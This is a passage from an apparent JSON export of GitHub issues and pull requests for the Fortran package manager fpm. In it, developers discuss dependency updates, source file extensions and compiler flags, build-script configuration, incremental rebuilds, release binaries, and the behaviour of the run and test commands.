syntax. Since the existing code already parses the TOML file and it already contains some of the most common metadata such as the version number this would fit into the existing fpm quite naturally, I believe.\nThe drawback to the user would be that no such module would exist  outside of fpm.  So adding -DFPM to the build lines would allow for #ifdef FPM to be used as a preprocessor directive, and leaving the built code in build/ for the user to grab or use as a template for a build outside of fpm(1) would be desirable."
                }
            ]
        },
        {
            "number": 251,
            "user": "awvwgk",
            "date": "2020-11-24 23:29:15+00:00",
            "title": "Dependency management",
            "text": "Opening this for discussion and feedback.\nFor a detailed documentation have a look at src/fpm/dependency.f90\n\n implement fpm-update command, will fetch all dependencies when called\n to force an update the --all flag can be used\n fine grain control over which dependencies are fetched is available by invoking with the dependency names\n use TOML data structure as \u201chash table\u201d for dependency management\n dependencies are stored in build/cache.toml, internal file for now, not part of the user API\n retrieve and store checked out revision in cache file\n report unused or orphaned dependencies (don't delete them?)\n find a way to actually test all this without requiring to actually fetch something\n more documentation\n\nRequires #247\nRelated #121",
            "comments": [
                {
                    "user": "LKedward",
                    "date": "2020-11-26 12:10:19+00:00",
                    "text": "Thanks @awvwgk, implementation looks nicely done. Apologies I'm not very familiar with cargo and similar programs so I have a few basic questions:\n\ndoes fpm update only update a dependency if the revision hasn't been specified with a commit or a tag in the manifest?\n\nwhen I try fpm update with a dependency with no version information in the manifest, I notice that no git-obj is produced in the dep-lock.toml - shouldn't the latest commit be stored here?\n\n\ncan I use fpm update to update dependencies after I've change the version information in the manifest?\ndoes the existing checkout procedure for dependencies need updating to use information from the lock file if it exists?"
                },
                {
                    "user": "awvwgk",
                    "date": "2020-11-26 12:33:12+00:00",
                    "text": "Thanks for testing, I'm still experimenting with a useful lock file format and possible update procedure. Right now the lock file is only descriptive to see how reusing information between two separate runs can work and acts more like a hash table to avoid having several versions of the same dependency around.\nGetting the actual commit after fetching a git dependency is still something to do.\nFinding a good fpm package to test is also quite a challenge, I use jsonff from @everythingfunctional, which has a moderately extensive dependency tree (there the current --all option fails, so I have to redo this part)."
                },
                {
                    "user": "awvwgk",
                    "date": "2020-11-28 15:16:34+00:00",
                    "text": "I think I found a stable way to actually handle the dependency update for now. I renamed the dep-lock.toml to cache.toml, since it is currently used as cache rather than an actual lock file.\nThe update command supports three modes now:\n\njust a plain fpm update will update all dependencies of the project\nwith fpm update <name>... all the provided dependency names are updated based on the information in the cache file\nfpm update --fetch-only will only fetch not already present dependencies, this mode will be used by all other commands interacting with dependencies\n\nThe more difficult part will be the creation of unit tests for this, without actually requiring to fetch some git repositories."
                },
                {
                    "user": "awvwgk",
                    "date": "2020-11-28 15:20:27+00:00",
                    "text": "@LKedward I'm not sure if I want to apply the fetch-only mode already for fpm-build since this might collide with #248, but I would definitely implement the same backend in a later PR or after #248 is merged."
                },
                {
                    "user": "everythingfunctional",
                    "date": "2020-11-28 15:26:46+00:00",
                    "text": "There are two ways to design such code to make it unit testable. In a functional style, the code returns the commands/actions it would like to be executed, and some other code further up the call chain is responsible for actually executing them. In this way the unit tests can check that the code is returning the correct actions.\nIn an object oriented style, the code makes use of an abstract derived type to execute the necessary commands/actions. In the \"production\" code the caller supplies a version which just executes the actions, but in the test code a version is provided which only records the actions without executing them so that the test can check them."
                },
                {
                    "user": "awvwgk",
                    "date": "2020-12-02 08:54:18+00:00",
                    "text": "I'll give this another try. I'll keep the command-line interface but use an iterative implementation rather than a recursive one."
                }
            ]
        },
        {
            "number": 250,
            "user": "ivan-pi",
            "date": "2020-11-23 10:16:04+00:00",
            "title": "Support additional file extensions",
            "text": "Once fpm will be out in the wild, we should try to support other Fortran file extensions.\nThis is not so important right now, but I thought I will create an issue since I gathered the information.\nHere is a table of file extensions with default support by different compilers:\n\n\n\nCompiler\nFixed-form\nFixed-form with preprocessor\nFree-form\nFree form with preprocessor\n\n\n\n\ngfortran\n.f, .for, .ftn\n.fpp, .F, .FOR, .FPP, .FTN\n.f90, .f95, .f03, .f08\n.F90, .F95, .F03, .F08\n\n\nifort\n.f, .for, .ftn, .i\n.fpp, .FPP, .F, .FOR, .FTN\n.f90, .i90\n.F90\n\n\nnvfortran\n.f .for .ftn\n.F .FOR .FTN .fpp .FPP\n.f90 .f95 .f03\n.F90 .F95 .F03\n\n\nnagfor\n.f, .for, .ftn\n.ff, .F\n.f90, .f95\n.ff90, .ff95, .F90, .F95\n\n\nCray\n.f, .for\n.F, .FOR\n.f90, .f95, .f03, .f08, .f18, .ftn\n.F90, .F95, .F03, .F08, .F18, .FTN\n\n\nIBM\n.f, .f77\n.F, .F77\n.f90, .f95, .f03, .f08\n.F90, .F95, .F03, .F08\n\n\ng95\n.f, .for\n.F, .FOR\n.f90, .f95, .f03\n.F90, .F95, .F03\n\n\n\nThe only options that are compatible along the tool-chains listed above are: .f, .F, .f90, .F90.\nThe .ftn extension has a clash between gfortran, ifort, and nagfor which assume fixed-form, and Cray which assumes free-form.\nTo enhance portability between compilers, we should either allow fpm to (copy and) rename the files silently, or have fpm print a message to the user to consider renaming his files.\nBlog posts related to this issue:\n\n\u201cSource Form Just Wants to be Free\u201d by Doctor Fortran\nFortran File Extensions by degenerateconic\n\nEdit: Feel free to add more compilers.",
            "comments": [
                {
                    "user": "ivan-pi",
                    "date": "2020-11-23 10:29:01+00:00",
                    "text": "On second thought, most compilers provide flags which allow to select fixed- or free-form format, meaning we could try and implement this without the need to rename files (e.g. if fpm doesn't have write access).\nBut perhaps printing an message to the user would shift the community in the direction of adopting the compatible extensions."
                },
                {
                    "user": "awvwgk",
                    "date": "2020-11-23 10:44:23+00:00",
                    "text": "Alternatively, we could decide on a minimal set compatible for all compilers and allow explicit extension / overwriting on per project basis in the package manifest (some projects use .f while being completely free format source)."
                },
                {
                    "user": "ivan-pi",
                    "date": "2020-11-23 10:53:34+00:00",
                    "text": "Good point. I recall now the dbcsr uses the .F extension for all their source files which are free-form.\nSo we should agree on some sane default behavior and allow the package developers to use whatever file extensions and source code format they want via the manifest."
                },
                {
                    "user": "ivan-pi",
                    "date": "2020-11-23 13:25:21+00:00",
                    "text": "Here is a table of the respective compiler options for controlling input source format and preprocessing:\n\n\n\nCompiler\nFixed-form\nFree-form\nInvoke (C) preprocessor\n\n\n\n\ngfortran\n-ffixed-form\n-ffree-form\n-cpp\n\n\nifort\n-fixed\n-free\n-fpp\n\n\nifort (Windows)\n/fixed\n/free\n/fpp\n\n\nnvfortran\n-Mfixed\n-Mfree\n-Mpreprocess\n\n\nnagfor\n-fixed\n-free\n-fpp\n\n\nCray\n-f fixed\n-f free\n-eP, -eZ\n\n\nIBM\n-qfixed\n-qfree, -k\n-qpreprocess\n\n\ng95\n-ffixed-form\n-ffree-form\n-cpp\n\n\nflang\n-Mfixed\n-Mfreeform\n-Mpreprocess\n\n\noracle f95\n-fixed\n-free\n-fpp or -xpp=fpp (cpp)\n\n\n\nFor fixed-form the default line length is 72. For free-form the default line lengths differ between compilers (132, 255, or any).\nThe preprocessors are not fully compatible between compilers."
                },
                {
                    "user": "awvwgk",
                    "date": "2020-11-23 14:04:07+00:00",
                    "text": "Added NVHPC/PGI compilers, which additionally support .cuf for CUDA Fortran and .CUF for preprocessed CUDA Fortran."
                },
                {
                    "user": "ivan-pi",
                    "date": "2020-11-23 14:55:55+00:00",
                    "text": "In the blog post from Steve, there is a link to a post from Intel: Problem: Fortran source files not compiled when building in Visual Studio, which shows how the source and header file extensions are specified in Visual studio.\nI haven't studied the manifest or TOML syntax closely, but I imagine this would mean introducing something like this:\n[build]\nsource.free = [\".f90\", \".f03\", \".f08\"]\nsource.fixed = [\".f\", \".f77\"]\nfpm would then neglect all files with other extensions. I am not sure if we need to specify any file extensions for include statements, or do we just allow the compiler to search for the files and report any errors?"
                },
                {
                    "user": "awvwgk",
                    "date": "2020-11-23 15:03:36+00:00",
                    "text": "I would remove the dot from the extension, but the general syntax looks good to me. We will probably need additional entries for the preprocessed files as well:\n[build.source]\nfree = [\"f90\", \"f03\", \"f08\"]\nfree-preprocess = [\"F90\", \"F03\", \"F08\", \"fypp\"]  # or free-pp\nfixed = [\"f\", \"f77\"]\nfixed-preprocess = [\"F\", \"F77\", \"fpp\"]  # or fixed-pp"
                },
                {
                    "user": "ivan-pi",
                    "date": "2020-11-23 16:23:33+00:00",
                    "text": "I agree that is cleaner.\nWith respect to the preprocesser, I think we might need to distinguish between external preprocessors (like fypp, or preform) and those built into the compiler (C-like macro processors). Interestingly, ifort has the option to specify an alternative preprocessor using the flag -fpp-name=<name>."
                },
                {
                    "user": "awvwgk",
                    "date": "2020-11-23 16:44:49+00:00",
                    "text": "The preprocessor and its operation mode (\"built-in\", \"external\") could be selected in a separate entry in the [build] table. In case fpm recognizes the Intel compiler, it could try to apply an external preprocessor using the given flag, but I fear we might need to preprocess separately anyway, in case module names are mangled with preprocessor directives."
                },
                {
                    "user": "urbanjost",
                    "date": "2020-11-23 18:35:03+00:00",
                    "text": "Unless the names are treated differently I am a strong advocate for just ..f|.F|.F90|.f90. If specifying a suffix like .f03 meant Fortran was required to strictly apply the standard as specified for that standard version (which is not the case as far as the standard is concerned) I do not like the other extensions.  For a package that is intended to be designed for use by others I think I prefer the user being required to do the preprocessing themselves and only present .f|.f90 files to fpm unless fpm bundles a \"standard\" preprocessor(s).  For fpm use building a local package I'm not quite as strong an advocate for that."
                },
                {
                    "user": "urbanjost",
                    "date": "2020-11-23 18:37:28+00:00",
                    "text": "Sun used to distribute an fpp command that was written in Fortran if I recall. I use my own. 96% of my Fortran files are actually .ff and .FF files that run through a preprocessor but a lot of experience has shown me you only distribute .f90 and .f files unless there is no alternative."
                },
                {
                    "user": "ivan-pi",
                    "date": "2020-11-24 09:48:30+00:00",
                    "text": "Unless the names are treated differently I am a strong advocate for just ..f|.F|.F90|.f90. If specifying a suffix like .f03 meant Fortran was required to strictly apply the standard as specified for that standard version (which is not the case as far as the standard is concerned) I do not like the other extensions. For a package that is intended to be designed for use by others I think I prefer the user being required to do the preprocessing themselves and only present .f|.f90 files to fpm unless fpm bundles a \"standard\" preprocessor(s). For fpm use building a local package I'm not quite as strong an advocate for that.\n\nPersonally, I agree with sticking to \".f\" for fixed, and \".f90\" for free form. Definitely, we should not tie the extensions to specific language standard. However, I am afraid that among developers there is not total consensus. As Steve notes in his blog post: \"as far as the standard was concerned, source lines were delivered to the \u201cprocessor\u201d (compiler) by fairies in the night.\", which I believe is still true today. The file extensions are merely a default set by compiler vendors. Misconceptions concerning file extensions and the Fortran language standards pop up routinely on comp.lang.fortran, Stack Exchange, r/Fortran, and now even on our Discourse.\nAdmittedly, when I started to learn Fortran for CFD, I used the \".f95\" extension. At that time I had never heard of Linux before, nor had I used the command line. The lowest entry point I could find was the Silverfrost FTN95 compiler on Windows. The example programs used the \".f95\" extension. In fact, I was not even aware that modern editions of Fortran existed, as all the examples I could find on the internet were procedural style CFD codes in F77 or F90. Only recently (three years ago!), when I got access to the Intel Fortran compiler at my university, I found out I need to use the \".f90\" extensions to have things work automatically. At the same time you have some respectable Fortran codebases (like cp2k), which bypass the default compiler options, and use \".F\" even for free-form.\nSince fpm is supposed to automatically detect Fortran source files, I believe in the future we should also search for other file extensions. If any are found, we have two options:\n\nInform the user that unless specified in the manifest, fpm assumes the source file extensions are \".f\" for fixed-form, and \".f90\" for free-form, and recommend the user to rename his files, or fill out the [build.source] section of the manifest.\nDetect automatically if the sources are free or fixed, and whether they  require preprocessing, and deal with it silently by setting all the necessary compiler flags.\n\nPersonally, I am in favor of the first option. As a beginner in Fortran, this would nudge me in the right direction.\nSpeaking of option 2, it seems like a fun project with neural-fortran, the input to the neural network could be the number of ! and C characters, frequency of spaces in the first six positions, frequency of upper and lower case letters, and the frequency of symbols suchs as #, @, and $ normally used by preprocessors."
                },
                {
                    "user": "urbanjost",
                    "date": "2020-11-25 19:51:14+00:00",
                    "text": "I like the neural-fortran idea better; but you just reminded me of some elaborate make(1) files I inherited that were all set up for the Intel compiler except these lines that called \"gfortran -fsyntax-only ...\" with the output module files thrown into a scratch directory and then erased and a bunch of other oddities. It took a moment looking at the subsequent lines to see he was compiling the code with syntax checking with gfortran only and forcing -ffixed-form (or whatever the option is) and if it failed the syntax check he was assuming it was free-form. A dangerous game but apparently it worked the way he wanted. We took it out and renamed the files and changed a few other parts that had .ftn and such built into them. Not recommending anyone use that method!  He had been moving a large amount of F77 code to free-format and apparently got tired of renaming the files and making related changes, I think.  Several compilers allow for directives in the source files to specify fixed versus free format at least down to the level of a single procedure. When changing old large multi-procedure files that is particularly handy (versus splitting them all apart of having to rewrite them all, and so on). If you are grabbing fixed-format codes and merging them into modules that is initially very useful. If would be nice when free-format was introduced if that had been an attribute you could specify at the beginning of a procedure definition, like\nfreeformat elemental pure function MYPROC(...\n\nbut specifying a code syntax attribute and function attributes together would probably not appeal to everyone."
                },
                {
                    "user": "ivan-pi",
                    "date": "2021-10-17 20:29:32+00:00",
                    "text": "For a package that is intended to be designed for use by others I think I prefer the user being required to do the preprocessing themselves and only present .f|.f90 files to fpm unless fpm bundles a \"standard\" preprocessor(s).\n\nI guess this is the right approach for small to medium size libraries, that only aim to provide Fortran procedures. Still we cannot exclude the use of a preprocessor for purposes like conditional compilation depending upon platform, compiler version, or other uses (compile-time selection of precision, using a different back-end library).\nI think with fpm we would also like to enable Fortran users to exchange templates and macros."
                }
            ]
        },
        {
            "number": 249,
            "user": "awvwgk",
            "date": "2020-11-22 09:01:00+00:00",
            "title": "build-script location",
            "text": "Currently the build-script can specified in the [library] table with:\nlibrary.build-script = \"build.mk\"\nFor an executable only project, a library table would still be required to select a build script, even if no library sources are actually available.\nAdding the build-script to the [build] table feels more intuitive. Either as build-script or to reduce redundancy, just script:\nbuild.build-script = \"build.mk\"\nbuild.script = \"build.mk\"\nThis might be a breaking change for some projects using this fpm feature.",
            "comments": [
                {
                    "user": "ivan-pi",
                    "date": "2021-01-20 20:27:10+00:00",
                    "text": "In Cargo, the default behavior is to check for a file named build.rs in the root of the package. A custom build script can be specified as:\n[package]\n# ...\nbuild = \"custom_build_name.rs\"\n\nTo disable automatic build script detection the setting is simply build = false. The possibility to use other build systems is then delegated to custom user packages which are called from build.rs.\nThe suggestion from @certik in #94 was to allow any kind of build script, be it a binary executable, shell script, Makefile, or other build system. Since fpm is only allowed to interact with the build script through environment variables and the output of the build script to standard output prepended with fpm:. This seemed like a reasonable idea. Upon further thought, I am worried this might become an obstacle for cross-compatibility between different operating systems. In this case fpm will need to report to the user to install CMake, Meson, Make, bash, etc. or whatever build system necessary.\nIn any case, do we also want to support such automatic build script detection?\nRelated to the immediate issue above, I agree that the [library] section does not feel right in case of executable-only projects. The build.script seems more fitting, also considering the fact the link keyword is in the same table."
                },
                {
                    "user": "awvwgk",
                    "date": "2021-01-20 21:51:10+00:00",
                    "text": "I always wondered why Makefiles take such a special role in fpm, while CMake and meson are standardized enough to give a somewhat predictable behaviour for third-party tools, a Makefile can hide all kind of surprises and caveats inside (I never get tired of a random Makefile suddenly starting to write stuff in my home directory).\nInteracting with other build files will always be difficult for fpm, have a look at fortran-lang/fortran-lang.org#157 for an incomplete list. Preferably we can convince projects to switch to fpm, but most likely we will end up with projects supporting fpm and their original build system. My projects currently all support meson, but many have additional fpm support or CMake support, depending on the communities they find use in.\n\nIn any case, do we also want to support such automatic build script detection?\n\nPlease don't, those features should be opt-in only, I don't want fpm to start auto-detecting my meson build files and force me to disable another of the automatic detection features in my projects."
                },
                {
                    "user": "ivan-pi",
                    "date": "2021-01-20 22:56:30+00:00",
                    "text": "I certainly agree we don't want fpm interacting with other build systems aimed to be use independently from fpm.\nMy proposition/question was only related to the way Cargo automatically looks for a build.rs file. Under this model behavior, and the suggestion from @certik, fpm could look for build.sh, build.mk, build.cmake, etc.\nBut given that Fortran is not a monolithic/centralized language like Rust, and that there is a large variety of different build systems in everday use, it makes more sense to require package developers to specify a build script explicitly and save us the trouble from having to disable it manually.\n(I admit to having a soft spot for auto-detecting a build.f90 program; the idea of writing a Fortran executable to specify a foreign language package build sounds both crazy and very fascinating at the same time.)"
                },
                {
                    "user": "awvwgk",
                    "date": "2021-01-20 23:17:07+00:00",
                    "text": "Okay, let's try to make the manifest syntax a bit more concrete.\nI would propose we could have external build scripts (as array of strings), they are invoked by fpm and we just hope they play nicely together with fpm, but guarantee for nothing:\nbuild.script = [\"make\", \"-f\", \"build.mk\"]  # or just [\"build.mk\"], make extension is detected\nbuild.script = [\"sh\", \"build.sh\"]  # or just [\"build.sh\"], shell extension is detected\nbuild.script = [\"python\", \"build.py\"]  # or just [\"build.py\"], Python extension is detected\nbuild.script = [\"ruby\", \"build.rb\"] # or just [\"build.rb\"], Ruby extension is detected\nbuild.script = [\"cmake\"]  # we might detect that it is CMake and run multiple steps for this script\nAnd actual build scripts like proposed in #94 (provided as string), we will allow any format supported by fpm (f90, f, F90, F and c) as well as scripts (we can detect extensions as well and try to call the script with the correct program):\nbuild.script = \"build.f90\"  # compile and run Fortran executable\nbuild.script = \"build.c\"  # compile and run C executable\nbuild.script = \"build.sh\"  # run shell script\nbuild.script = \"build.py\"  # run Python script\nbuild.script = \"build.rb\"  # run Ruby script\nThe script is expected to produce fpm: instructions which fpm parses and uses to build the project.\nThis might require a new table of build-dependencies at some point, which are usable in the build script."
                },
                {
                    "user": "ivan-pi",
                    "date": "2021-01-21 00:36:41+00:00",
                    "text": "This might require a new table of build-dependencies at some point, which are usable in the build script.\n\nThis only seems to make sense for build scripts which are C or Fortran executables, allowing fpm to resolve (and reuse) their dependencies. Am I right? (I see many signs fpm will ultimately evolve also into a C package manager. )\nIs there any intrinsic benefit to supporting build scripts in dynamic languages directly (apart from user convenience)? This could be done after all in a Fortran main program:\n! build.f90\nwrite(*,*) \"fpm:rerun-if-changed=build.py\"\ncall execute_command_line(\"python build.py\")\nend"
                },
                {
                    "user": "LKedward",
                    "date": "2021-01-22 11:01:04+00:00",
                    "text": "I wonder whether we should perhaps separate discussion of build scripts into those with one-way and two-way communication with fpm. The former, implemented experimentally in Haskell version, receive inputs via environment variables and are expected to place libraries in the correct location. The latter have reverse-communication with fpm via stdout (#94) for more advanced behaviour.\nMy intention for #219 was only to initially implement one-way build scripts to support cases such as #341. In terms of specification I think that we should avoid hard-coding the detection of specific file-extensions or build systems and simply have an array of strings to be invoked at the command line by fpm (I like your proposed syntax for this above @awvwgk).\nWhile I like the idea of build.f90 etc., I'm hesitant to prioritise build scripts with reverse communication at such an early stage in fpm development. IMHO I think we should encourage package maintainers to adopt the native fpm package structure and work with them to improve fpm accordingly."
                },
                {
                    "user": "ivan-pi",
                    "date": "2021-01-22 15:56:03+00:00",
                    "text": "That is a good way to look at it. I imagine in a one way setup, the script invoked would be responsible to place all the necessary executable files, module files, and binaries into a specified folder.\nWould it then be up to the package developer to hard code any flags required for linkage straight into the manifest of the package?"
                },
                {
                    "user": "ivan-pi",
                    "date": "2021-01-22 16:04:03+00:00",
                    "text": "In terms of specification I think that we should avoid hard-coding the detection of specific file-extensions or build systems and simply have an array of strings to be invoked at the command line by fpm (I like your proposed syntax for this above @awvwgk).\n\nWould this also work in the eventual case of a Fortran main program? For example:\nbuild.script = ['$FPM_FC', 'build.f90', '-o', 'build', '&&', './build']\n\nI can imagine this would become unwieldy, if my build program requires some other fpm-sourced modules.\nBut I agree to prioritise the first case (no reverse communication), as it would already enable a lot more complex projects."
                },
                {
                    "user": "awvwgk",
                    "date": "2021-01-22 16:13:36+00:00",
                    "text": "Would this also work in the eventual case of a Fortran main program? For example:\nbuild.script = ['$FPM_FC', 'build.f90', '-o', 'build', '&&', './build']\n\n\nThis should not be allowed, because we will guard the command execution against variable expansion and command chaining at some point, see #166.\nI took some inspiration from docker where entry points and commands are defined differently by syntax, of course we can separate the one and two way communication more easily by allowing separate entries which are mutually exclusive. The advantage of only allowing a string for a two way build script instead of a full command line is that we move the complexity from the package manifest (configuration file) to the build script (full programming language)."
                }
            ]
        },
        {
            "number": 248,
            "user": "LKedward",
            "date": "2020-11-21 16:33:23+00:00",
            "title": "Refactor backend for incremental rebuilds",
            "text": "This PR contains the required changes to implement incremental rebuilds (Resolves #212):\n\nMoves enumeration of link objects to occur before the backend is called\nAdds source file hashing to determine whether targets need rebuilding\nSeparates target scheduling from target compilation which:\n\nallows unit-testing of backend sorting and scheduling\noptionally allows parallel builds when compiled with openmp (bootstrap: fpm build --flag -fopenmp --flag -O3)",
            "comments": [
                {
                    "user": "LKedward",
                    "date": "2020-11-28 16:40:02+00:00",
                    "text": "Thanks for reviewing; suggestions applied.\n\nI had a few issues when switching branches with git and rebuilding, but those might also result from incompatible module files left in the build directory\n\nI've been having this issue with the bootstrap version but can't find the source of the problem. I haven't (yet) encountered this problem with this Fortran implementation \u2014 I will look into it for a future PR \ud83d\udc4d"
                },
                {
                    "user": "awvwgk",
                    "date": "2020-11-28 16:52:36+00:00",
                    "text": "I've been having this issue with the bootstrap version but can't find the source of the problem. I haven't (yet) encountered this problem with this Fortran implementation\n\nMaybe I encountered this while running fpm run -- build, hard to tell exactly which fpm failed, since it was an issue from gfortran complaining about incompatible module files. I cleaned both build directory afterwards (rm -r build/gfortran_*), but we will certainly get the chance to mess the build process up often enough in the future."
                },
                {
                    "user": "LKedward",
                    "date": "2020-12-02 10:30:32+00:00",
                    "text": "Many thanks for reviewing; I'll merge later today if there are no more comments."
                },
                {
                    "user": "urbanjost",
                    "date": "2020-12-02 14:13:24+00:00",
                    "text": "Apparently there is an issue with an old version of Firefox working with the reviews. I thought I had approved this days ago but I noticed it is not checked. Others comments covered my issues so I have no problem with this going forward. Sorry if that caused a delay. Hopefully this works from this browser."
                }
            ]
        },
        {
            "number": 247,
            "user": "awvwgk",
            "date": "2020-11-21 12:09:14+00:00",
            "title": "Refactoring of manifest types",
            "text": "Minor changes for consistency:\n\nmove manifest defaults from fpm to fpm_manifest\nrename all manifest types from *_t to *_config_t, frees names like executable_t or dependency_t.\nnames of instances in package_config_t correspond to table names in manifest",
            "comments": [
                {
                    "user": "LKedward",
                    "date": "2020-11-25 09:28:51+00:00",
                    "text": "The only semantic change in this PR is a minor refactoring of the package defaults \u2014 everything else is variable naming so I will merge. Thanks @awvwgk"
                }
            ]
        },
        {
            "number": 246,
            "user": "LKedward",
            "date": "2020-11-19 17:23:44+00:00",
            "title": "CI: upload binaries when a release is published",
            "text": "This PR updates the CI so that it is additionally triggered when a github release is published to which it will upload binaries (Linux, Mac, Windows) for both versions of fpm as release assets (example here).\nAs discussed at last month's meeting, this simplifies the bootstrapping process (on the supported platforms) and also simplifies using fpm in your own CI.\nAfter running the usual tests, the CI checks that the release tag, of the form vx.y.z, matches that output by fpm --version;\nbinaries are not uploaded if the release tag does not match (example workflow)\nFor the time being, releases can be created by maintainers at their own discretion as features are added and bugs fixed (I'm happy to do this); in the long term, a release process will need to be discussed and documented.\nI intend to create an initial release (v0.1.0) following this PR.\nResolves #218.",
            "comments": [
                {
                    "user": "LKedward",
                    "date": "2020-11-19 21:40:23+00:00",
                    "text": "One minor thing: Could we generate some SHA256 hashes for each release artefact?\n\nGood point; yep I'll add them in.\n\nAlso, how are prerelease events handled?\n\nThey should be treated the same as a normal release - I'll check tomorrow.\nThanks @milancurcic, yes I agree about the naming - I'll reorder with the actual version number in and add +x permission.\n\n@everythingfunctional, do you know if compilation of statically-linked binaries is possible with Haskell stack?"
                },
                {
                    "user": "LKedward",
                    "date": "2020-11-21 10:07:24+00:00",
                    "text": "Thanks for reviewing; I've updated the file naming convention as suggested and added hashes for checking integrity.\nUnfortunately I can't seem to preserve executable permissions on the Linux/MacOS binaries when added as assets - I think this may be a limitation (or security feature?) of github."
                },
                {
                    "user": "awvwgk",
                    "date": "2020-11-21 11:10:24+00:00",
                    "text": "It is probably a security feature. One option to preserve the permissions would be packaging in a tarball/zip archive instead, but this would increase the \u201cinstallation barrier\u201d slightly."
                },
                {
                    "user": "LKedward",
                    "date": "2020-11-25 09:34:06+00:00",
                    "text": "If there are no objections or further comments I will merge later today and create an initial release with tag 'v0.1.0'."
                },
                {
                    "user": "LKedward",
                    "date": "2020-11-25 16:34:57+00:00",
                    "text": "I've created a tag v0.1.0 and corresponding release, for which the workflow has executed successfully and there are now binaries to download. Since this is the first release, instead of a change-log I have simply summarised the features currently supported in each version."
                }
            ]
        },
        {
            "number": 245,
            "user": "urbanjost",
            "date": "2020-11-19 13:43:25+00:00",
            "title": "should run and test default to listing instead of running all cases and have a --all switch?",
            "text": "I find a more intuitive behavior for run and test if that if there is just one target it runs it; but if there is more than one it just lists the candidates and that you either have to use a new switch --all to get the current behavior or give a list of targets. Does that seem like a necessary change to anyone else? Adding the switch is not much of a burden and if you have dozens of apps or tests right now the only way to get a nice list is to enter a name that does not exist. Another option might be to have a switch like -toc that lists the candidates in the nice table you get when you enter a bad name.",
            "comments": [
                {
                    "user": "awvwgk",
                    "date": "2020-11-23 17:02:55+00:00",
                    "text": "The other way round it makes more sense to me. I would use a --list option to get all possible targets. I think at least for test that should show the integrity of the project I would prefer to run all tests rather than getting a list (and exit status zero).\nConsider a CI setup with fpm, both fpm test and fpm test --all would return a zero exit status, but the former would only work as expected for projects with a single test target. Together with the automatic discovery of test executables this might lead to surprising outcomes.\nBut it can certainly dependent on the design of the project. After I started using fpm more seriously in my projects, I reconsidered some of my project designs for fpm, leading to overall smaller projects with usually a single executable target per project."
                },
                {
                    "user": "LKedward",
                    "date": "2021-02-14 11:57:13+00:00",
                    "text": "I agree that fpm test should run all tests by default, but I agree with @urbanjost with respect to fpm run; I really don't like having fpm run behave the same way as fpm test. Some libraries come with many example programs and it doesn't make sense to invoke them all sequentially. I also find myself purposely invoking fpm run invalid_name to get a nice list of programs so that I can run them one by one.\nWhat does everyone think to changing fpm run to require a program name argument if there is more than one program/example available and using flags to run all programs and/or examples sequentially?\n$ fpm run NAME | [--programs] [--examples] \nwhere NAME can be the executable name for any program or example.\nI think cargo run has a similar requirement when more than one executable target is available (but their selection syntax is too verbose IMO)."
                },
                {
                    "user": "urbanjost",
                    "date": "2021-02-14 16:38:13+00:00",
                    "text": "Yes Thumbs up.\nCONSIDER A MENU MODE\nI have another alternative I have experimented with -- menus.\nI have an alpha-alpha version of my own that:\n\nhas the Fortran intrinsics available via help\nlooks for a command in the search path called fpm-NAME when an unknown subcommand is called\nallows for \"response files\" as described in the M_CLI2 module\nallows for a -i switch on run and test\nstarts a shell-like interface if no options are specified on fpm (very basic)\nnone of the ideas I played with my private \"alpha-alpha\" version were show-stoppers that I thought had a priority above the bigger things that were going on like auto-dependencies (and I think are all still behind allowing compiler and load options and a command-line  way of adding packages to the search list and having something like avpkg built-in  (I renamed my copy of avpkg fpm-search and call it with 2) above, by the way) but when it looked like this proposal was not going anywhere I  become fond of \"4)\" -- the -i switch is for \"interactive\" mode (maybe it should be -m for \"menu\" mode) but it produces a menu list of the executables and you can pick them numerically. Just mentioning it as an alternative idea; my private version diverged enough it would probably be easier to reintroduce it in the main code than to pull it from it.\n\nSTILL OCCASIONALLY WANT TO RUN ALL\nI did not pick up on your idea of just making test and run behave differently, which seems such an obvious solution after the fact!  So all for it. I agree that I want to run all the tests the majority of the time; usually I just want to run one only when I am writting one.\nI do occasionally want to run everything  ( one example is a graphics library where I want to pick a file output format and run all the examples, which there are dozens of).\nSo like you said except add\nfpm run '*'\nfpm run '*' --example\nas special cases where  you want to run all the cases.\nFANCIER MATCHING?\nMaybe globbing or RE or even a --all switch would be better?\nSince '*' is really a glob expression note there is  a simple globbing routine in M_strings  called matchw(just does * and ? not [...] and such) that would be a nice compromise and that I think most users would already be familiar with the syntax of. There is also a routine of the same name by Clive Page available in a lot of places including the Fortran Wiki but I am not sure of the licensing.\nOr would it be nice for that (outlier?) case if the names could be Regular Expressions since you have to quote the * anyway?\nI started a Fortran-based BRE module called M_match based on the original Ratfor version for those times where depending on the C libraries was not desirable but it needs work (PS: pretty sure Regular Expressions were first written in that Fortran variant -- ironic it is so hard to find a Fortran version now-adays).  It would work well enough to be able to say things like 'fpm run '.*'` for now though, even as if as a place-holder for something better someday.\nIn lieu of that I would still like a --all switch for those admittedly rare cases where I want to run all the examples (sometimes just to make sure they all still run, more like a test than an example).\nI think the '*' is nice and avoids bloating the run command with rarely used options. But since it needs quoted maybe going the whole way to RE would add greater flexibility but might be overkill unless there are other options where it would be useful, like searching for packages or through the help.  The -all switch needs no quoting.\nThere is also the case of having some alphameric reserved name like ALL acting as a flag, but I rarely like that method, and I think has drawbacks here.\nSUMMARY\nSo good with just changing run as you described; throwing out the \"menu\" idea to see if there is any interest\", and would like a way to occasionally run them all without having to name them all (I have some packages with dozens of example names I would hate to have to name individually when using them for a \"confidence test\") . Probably just allowing '*' to mean all would be the simplest  -- and also keep run from getting bloated with rarely-used options; We could get fancier using globbing or RE but not sure if anyone needs that."
                },
                {
                    "user": "LKedward",
                    "date": "2021-02-18 14:10:10+00:00",
                    "text": "Some great ideas @urbanjost. Yes an interactive menu code would definitely be useful when you want to select from many programs; I think it would be a good candidate for the proposed plugins mechanism once the fpm model is accessible.\nI hadn't thought of RE matching but it is something that would certainly be useful to run subsets of tests/programs. And '*' is nice and short compared to a flag."
                },
                {
                    "user": "urbanjost",
                    "date": "2021-02-21 16:05:25+00:00",
                    "text": "CARGO\nLooked up cargo(1) and it does something similar as mentioned, where if there is only one target it is used unspecified, otherwise it has to be listed. Not sure if it lists available targets or can take RE or globbing for names. Curious about that and if there if anyone is using anything else with similiar\nrequirements and how it is handled.\nIf neither `--bin` nor `--example` are given, then if the package only has one\nbin target it will be run. Otherwise `--bin` specifies the bin target to run,\nand `--example` specifies the example target to run. At most one of `--bin` or\n`--example` can be provided."
                },
                {
                    "user": "LKedward",
                    "date": "2021-03-31 18:43:30+00:00",
                    "text": "Discussed behaviour was changed in #370 so closing."
                }
            ]
        },
        {
            "number": 244,
            "user": "urbanjost",
